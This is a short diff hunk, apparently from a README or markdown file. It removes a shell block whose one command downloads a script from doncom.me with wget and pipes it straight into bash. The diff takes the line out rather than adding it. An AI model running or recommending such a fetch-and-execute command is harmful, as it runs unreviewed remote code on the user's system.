@@ -3,9 +3,7 @@
 
 
 
-```shell
-bash -c "$(wget -qO- doncom.me/libftrev.sh)"
-```
+
 
 
 
